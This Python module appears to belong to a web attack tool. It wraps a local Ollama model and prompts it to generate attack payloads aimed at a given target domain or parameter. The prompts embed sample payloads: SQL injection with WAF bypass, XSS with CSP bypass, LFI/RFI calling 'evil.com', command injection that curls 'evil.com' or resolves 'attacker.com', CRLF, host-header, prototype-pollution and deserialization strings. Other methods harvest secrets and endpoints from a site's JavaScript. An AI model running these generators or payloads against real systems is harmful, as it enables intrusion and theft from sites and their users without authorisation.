import json
import requests
from utils.output import info, warning, error, section

OLLAMA_DEFAULT_HOST = "http://localhost:11434"
OLLAMA_DEFAULT_MODEL = "dolphin3:8b"


class OllamaHelper:
    def __init__(self, model=None, host=None):
        self.model = model or OLLAMA_DEFAULT_MODEL
        self.host = host or OLLAMA_DEFAULT_HOST
        self.base_url = f"{self.host}/api"
        self.available = False
        self._check_available()

    def _check_available(self):
        try:
            r = requests.get(f"{self.base_url}/tags", timeout=5)
            if r.status_code == 200:
                models = [m["name"] for m in r.json().get("models", [])]
                if self.model not in models and not any(self.model in m for m in models):
                    warning(f"Model '{self.model}' not found in Ollama. Available: {models[:5]}")
                self.available = True
                info(f"Ollama connected ({self.model})")
            else:
                warning(f"Ollama API returned {r.status_code}")
        except requests.exceptions.ConnectionError:
            warning("Ollama not reachable. Install: https://ollama.ai")
        except Exception as e:
            warning(f"Ollama check failed: {e}")

    def _call(self, prompt, system=None, temperature=0.3, max_tokens=2000):
        if not self.available:
            return None
        payload = {
            "model": self.model,
            "prompt": prompt,
            "stream": False,
            "options": {"temperature": temperature, "num_predict": max_tokens},
        }
        if system:
            payload["system"] = system
        try:
            r = requests.post(f"{self.base_url}/generate", json=payload, timeout=60)
            if r.status_code == 200:
                return r.json().get("response", "").strip()
            warning(f"Ollama API error: {r.status_code}")
        except Exception as e:
            error(f"Ollama call failed: {e}")
        return None

    def _parse_list(self, text):
        if not text:
            return []
        lines = []
        for line in text.split("\n"):
            line = line.strip().strip('"').strip("'").strip(",")
            if line and not line.startswith(("#", "//", "-")):
                line = line.lstrip("*-0123456789. )")
            if line and not line.startswith(("#", "//", "```")):
                lines.append(line.strip())
        result = []
        for l in lines:
            l = l.strip()
            if l and not l.startswith("```"):
                result.append(l)
        return result


    def generate_admin_paths(self, domain, tech_stack=None):
        tech_str = ", ".join(tech_stack) if tech_stack else "unknown"
        prompt = f"""Target domain: {domain}
Detected technology: {tech_str}

Generate a list of 20 likely admin panel, login, and backend paths for this specific tech stack.
Consider framework conventions, CMS defaults, and common developer patterns.
Return ONLY one path per line, starting with /. Do not number them. Do not explain.

Examples for WordPress: /wp-admin, /wp-login.php, /wp-json
Examples for Laravel: /admin, /nova, /admin/login
Examples for Django: /admin, /admin/login
Examples for custom Node.js: /admin, /dashboard, /api/admin"""
        resp = self._call(prompt, temperature=0.2, max_tokens=800)
        return self._parse_list(resp)


    def generate_dir_paths(self, domain, tech_stack=None):
        tech_str = ", ".join(tech_stack) if tech_stack else "unknown"
        prompt = f"""Target: {domain}
Tech stack: {tech_str}

List 30 common or framework-specific directories, files, and endpoints for this tech stack.
Include sensitive files, config files, API endpoints, and hidden resources.
Return ONLY one path per line, starting with /. Do not explain.

Examples: /backup, /.env, /api/users, /swagger.json, /graphql, /actuator/health"""
        resp = self._call(prompt, temperature=0.2, max_tokens=800)
        return self._parse_list(resp)


    def generate_fuzz_payloads(self, param_name, tech_stack=None, response_clues=None):
        tech_str = ", ".join(tech_stack) if tech_stack else "unknown"
        clues = str(response_clues or "no specific clues")
        prompt = f"""Parameter name: {param_name}
Tech stack: {tech_str}
Response clues: {clues}

Generate 10 creative fuzzing payloads for this parameter that might trigger:
- SQL injection (if database-backed)
- Server-side template injection (if Node/Python/PHP)
- Command injection
- Path traversal
- NoSQL injection (if Mongo)
- LDAP injection (if LDAP)

Return ONLY one payload per line. No numbering. No explanations."""
        resp = self._call(prompt, temperature=0.4, max_tokens=600)
        return self._parse_list(resp)

    def generate_sqli_payloads(self, dbms=None):
        db = dbms or "generic"
        prompt = f"""Target database: {db}

Generate 15 advanced SQL injection payloads specific to {db} that might bypass WAF filters.
Include: error-based, UNION, time-based, boolean blind, and stacked query variants.
Use encoding, comments, and case variations for WAF bypass.
Return ONLY one payload per line. No explanations.

Examples for MySQL: 1' AND (SELECT 1 FROM (SELECT SLEEP(3))a) -- -
Examples for MSSQL: 1'; WAITFOR DELAY '0:0:5' -- -"""
        resp = self._call(prompt, temperature=0.4, max_tokens=700)
        return self._parse_list(resp)


    def generate_xss_payloads(self, context_hint=None, csp=None):
        hint = context_hint or "generic HTML context"
        csp_str = csp or "no CSP"
        prompt = (
            f"Context: {hint}\n"
            f"CSP: {csp_str}\n\n"
            f"Generate 15 creative XSS payloads that work in this context.\n"
            f"Consider: CSP bypasses, polyglots, DOM clobbering, mXSS, and framework-specific vectors.\n"
            f"Return ONLY one payload per line. No explanations.\n\n"
            f"Examples: <img src=x onerror=alert(1)>\n"
            f"Examples: javascript:alert(1)\n"
            f'Examples: " onmouseover=alert(1) x="\n'
        )
        resp = self._call(prompt, temperature=0.4, max_tokens=700)
        return self._parse_list(resp)

    def analyze_form_security(self, form_html, url):
        prompt = f"""Analyze this HTML form at {url} for security vulnerabilities:

{form_html[:2000]}

Check for:
1. Missing CSRF tokens
2. Password fields over HTTP
3. Sensitive field exposure
4. Hidden fields with predictable values
5. File upload without restrictions
6. Autocomplete on sensitive fields
7. Insecure form actions

List specific issues found. Be concise. One issue per line."""
        resp = self._call(prompt, temperature=0.1, max_tokens=600)
        return self._parse_list(resp)


    def analyze_js_for_secrets(self, js_content, url):
        snippet = js_content[:6000]
        prompt = f"""Analyze this JavaScript from {url} for hardcoded secrets, API endpoints, internal routes, and security-relevant strings:

{snippet}

Return findings as one per line in format:
TYPE: value
Valid types: API_KEY, ENDPOINT, SECRET, TOKEN, INTERNAL_URL, AWS_KEY, JWT_TOKEN, PASSWORD

Only report actual hardcoded values. Skip minified/library code fragments."""
        resp = self._call(prompt, temperature=0.1, max_tokens=800)
        return self._parse_list(resp)

    def find_js_endpoints(self, js_content, url):
        snippet = js_content[:8000]
        prompt = f"""Extract ALL API endpoints, webhook URLs, internal routes, and GraphQL endpoints from this JavaScript from {url}:

{snippet}

Return one endpoint per line, with the full path. Be thorough - look for:
- Fetch/XHR URLs
- WebSocket URLs
- GraphQL queries/mutations
- Internal route patterns
- API version paths

Return ONLY the paths. One per line."""
        resp = self._call(prompt, temperature=0.1, max_tokens=1000)
        return self._parse_list(resp)

    def generate_redirect_bypasses(self, original_url, observed_behavior=None):
        behavior = str(observed_behavior or "blocked by WAF")
        prompt = f"""Target URL: {original_url}
Observed behavior: {behavior}

Generate 10 open redirect bypass techniques for this target.
Try: URL encoding, unicode normalization, @ separator tricks, protocol confusion, CRLF, double encoding, parameter pollution.
Return ONLY one payload per line. No explanations.

Examples: /\\evil.com
Examples: //evil%40official.com
Examples: https://evil.com%2F@real.com"""
        resp = self._call(prompt, temperature=0.4, max_tokens=600)
        return self._parse_list(resp)

    def analyze_tech_response(self, headers, body_snippet, url):
        h = json.dumps(dict(headers), indent=2)[:1500]
        b = body_snippet[:3000]
        prompt = f"""Analyze this HTTP response from {url} to identify the web technology stack:

Headers:
{h}

Body snippet:
{b}

Identify: CMS, framework, programming language, web server, CDN, analytics, JS libraries, database.
Return findings as one per line: "Technology: confidence% | evidence"."""
        resp = self._call(prompt, temperature=0.1, max_tokens=500)
        return self._parse_list(resp)

    def analyze_redirect_chain(self, chain):
        chain_str = json.dumps(chain, indent=2)[:3000]
        prompt = f"""Analyze this HTTP redirect chain for security issues:

{chain_str}

Check for:
1. Open redirect patterns (final destination differs significantly from origin)
2. HTTPS → HTTP downgrades
3. Cookie leakage across redirects
4. Redirect loops
5. Suspicious intermediate domains
6. Mixed content warnings

For each issue found, explain the risk concisely. Suggest remediation if applicable.
If no issues, state that the chain appears safe."""
        return self._call(prompt, temperature=0.2, max_tokens=600)


    def analyze_robots_txt(self, parsed_robots, base_url):
        prompt = f"""Analyze this robots.txt configuration for {base_url}:

Disallowed paths: {json.dumps(parsed_robots.get('disallowed', {}), indent=2)}
Sitemaps: {parsed_robots.get('sitemaps', [])}
Crawl delays: {parsed_robots.get('crawl_delay', {})}

For each disallowed path, suggest:
1. What kind of resource is likely hidden there
2. Whether it's worth investigating manually
3. Any security implications if the path is accessible

Highlight the most interesting findings first. Be concise."""
        return self._call(prompt, temperature=0.2, max_tokens=600)

    def analyze_sitemap_urls(self, urls, base_url=None):
        sample = urls[:100]
        prompt = f"""Analyze these URLs from sitemap.xml for recon opportunities:

URLs ({len(urls)} total, showing first {len(sample)}):
{json.dumps(sample, indent=2)}

Identify:
1. API endpoints or structured URL patterns
2. Admin or backend paths
3. Unusual file types (.json, .xml, .sql, .bak, etc.)
4. User profile or PII-containing URLs
5. Staging/dev/test paths
6. Login or authentication pages

Group by pattern and prioritize interesting findings. Be concise."""
        return self._call(prompt, temperature=0.2, max_tokens=700)
    

    def analyze_shodan_results(self, matches, search_query):
        summary = []
        for m in matches[:30]:
            summary.append({
                "ip": m.get("ip_str"),
                "port": m.get("port"),
                "product": m.get("product"),
                "org": m.get("org"),
                "hostnames": m.get("hostnames", [])[:2],
            })
        prompt = f"""Analyze these Shodan search results for query "{search_query}":

{json.dumps(summary, indent=2)}

Highlight:
1. Most interesting or unusual services found
2. Common patterns across hosts
3. Potential security concerns
4. Recommended next recon steps based on findings

Be concise and actionable."""
        return self._call(prompt, temperature=0.2, max_tokens=600)

    def generate_lfi_payloads(self, target, tech_stack=None):
        tech = ", ".join(tech_stack) if tech_stack else "unknown"
        prompt = f"""Target: {target}
Tech: {tech}

Generate 20 LFI (Local File Inclusion) and RFI (Remote File Inclusion) payloads.
Include:
- Path traversal with depth variations: ../../../etc/passwd
- PHP wrappers: php://filter, php://input, data://
- Null byte injection (for old PHP): /etc/passwd%00
- RFI with remote URLs: http://evil.com/shell.txt?
- /proc/self/environ, /proc/self/fd/*
- Windows paths: C:\\boot.ini, ..\\..\\windows\\system32\\drivers\\etc\\hosts
- Log poisoning paths: /var/log/apache2/access.log
- Expect wrapper: expect://id

Return ONLY one payload per line. No numbering. No explanations."""
        resp = self._call(prompt, temperature=0.3, max_tokens=800)
        return self._parse_list(resp)

    def generate_cmd_injection_payloads(self, param_name, tech_stack=None):
        tech = ", ".join(tech_stack) if tech_stack else "unknown"
        prompt = f"""Parameter: {param_name}
Tech: {tech}

Generate 15 command injection payloads for this parameter.
Include:
- Basic: ; id, | whoami, `id`
- Blind/time-based: ; ping -c 5 127.0.0.1, | sleep 5
- Out-of-band: ; nslookup attacker.com, | curl http://evil.com
- Subshell: $(whoami), $(sleep 5)
- Newline: %0A id
- No-space bypass: {chr(36)}{chr(7)}~{chr(36)}BASH
- WAF bypass: /???/???t/c?t /???/p?ss?d

Return ONLY one payload per line. No numbering. No explanations."""
        resp = self._call(prompt, temperature=0.3, max_tokens=700)
        return self._parse_list(resp)

    def generate_nosql_payloads(self, param_name, db_type="mongodb"):
        prompt = f"""Parameter: {param_name}
Database: {db_type}

Generate 12 NoSQL injection payloads for {db_type}.
Include:
- MongoDB: $ne, $gt, $regex, $where, JSON body injection
- True conditions: ' || '1'=='1, ' || true || '
- Blind: {chr(123)}$where: "sleep(5000)"{chr(125)}
- $regex for blind extraction: ?param[$regex]=^a

Return ONLY one payload per line. No numbering. No explanations."""
        resp = self._call(prompt, temperature=0.3, max_tokens=600)
        return self._parse_list(resp)

    def generate_host_header_payloads(self, domain):
        prompt = f"""Domain: {domain}

Generate 12 Host header injection payloads for {domain}.
Include:
- Different domain: evil.com
- X-Forwarded-Host injection
- Multiple Host headers (HTTP/1.1 request smuggling)
- Port injection: example.com:9999
- Subdomain confusion: evil.example.com
- Line feed injection (CRLF via Host)
- Absolute URL in Host
- IP instead of domain

Return ONLY the host header value per line. No numbering. No explanations."""
        resp = self._call(prompt, temperature=0.3, max_tokens=600)
        return self._parse_list(resp)

    def generate_crlf_payloads(self, context_hint="parameter"):
        prompt = f"""Context: injection in {context_hint}

Generate 12 CRLF (HTTP Response Splitting) injection payloads.
Include:
- Basic: %0d%0aSet-Cookie:malicious=value
- %0a only (LF) variants
- %0d only (CR) variants
- Double encoding: %250d%250a
- Unicode: %u000d%u000a
- XSS via CRLF: %0d%0a<script>alert(1)</script>
- Header injection: %0d%0aLocation: http://evil.com

Return ONLY one payload per line. No numbering. No explanations."""
        resp = self._call(prompt, temperature=0.3, max_tokens=600)
        return self._parse_list(resp)

    def generate_prototype_pollution_payloads(self, framework="express"):
        prompt = f"""Framework: {framework}

Generate 10 server-side prototype pollution payloads for Node.js/{framework}.
Include:
- __proto__ pollution via JSON body: {{"__proto__": {{"isAdmin": true}}}}
- constructor.prototype: {{"constructor": {{"prototype": {{"polluted": true}}}}}}
- Nested pollution
- Array-based pollution
- Header-based pollution
- Query string pollution: ?__proto__.isAdmin=true
- Middleware-specific vectors for {framework}

Return ONLY one payload per line (as JSON or query string). No numbering. No explanations."""
        resp = self._call(prompt, temperature=0.3, max_tokens=600)
        return self._parse_list(resp)

    def generate_deserialization_payloads(self, language="php"):
        prompt = f"""Language: {language}

Generate 12 insecure deserialization payload snippets for {language}.
Include:
- PHP: O:7:"Example":1:{{s:3:"cmd";s:6:"whoami";}}
- Python pickle: cos\\nsystem\\n(S'whoami'\\ntR.
- Java: Runtime.exec gadgets (ysoserial-style)
- Ruby YAML: --- !ruby/object:Shell
- .NET: PowerShell-based deserialization
- Node.js: node-serialize payloads

Return ONLY one payload per line. Use escaped strings where needed. No explanations."""
        resp = self._call(prompt, temperature=0.3, max_tokens=800)
        return self._parse_list(resp)

    def generate_wordlist_entries(self, target, tech_stack=None, page_content=None):
        tech = ", ".join(tech_stack) if tech_stack else "unknown"
        content_sample = (page_content[:2000] + "...") if page_content else "no content available"
        prompt = f"""Target: {target}
Tech: {tech}
Page content sample: {content_sample}

Generate 30 potential directory/file/parameter names for a custom wordlist for this target.
Include:
- Framework-specific paths and endpoints
- Common admin/API paths for the detected tech
- Parameter names likely used by the application
- File names (.env, config, backup) specific to the tech
- Subdomain name ideas based on the brand/domain
- Endpoint names based on page content patterns

Return ONLY one word per line. Single words or single path components (no full paths). No explanations."""
        resp = self._call(prompt, temperature=0.2, max_tokens=800)
        return self._parse_list(resp)

    def analyze_shodan_host(self, host_data):
        summary = {
            "ip": host_data.get("ip_str"),
            "ports": host_data.get("ports", [])[:20],
            "hostnames": host_data.get("hostnames", [])[:5],
            "org": host_data.get("org"),
            "os": host_data.get("os"),
            "vulns": host_data.get("vulns", [])[:10],
            "services": [
                {"port": s.get("port"), "product": s.get("product"), "version": s.get("version")}
                for s in host_data.get("data", [])[:15]
            ],
        }
        prompt = f"""Analyze this Shodan host intelligence report:

{json.dumps(summary, indent=2)}

Provide:
1. Attack surface summary — what services are exposed
2. Risk assessment — any vulnerable services or unusual ports
3. Recommended security improvements
4. Additional recon suggestions based on findings

Be concise and prioritize critical findings."""
        return self._call(prompt, temperature=0.2, max_tokens=600)
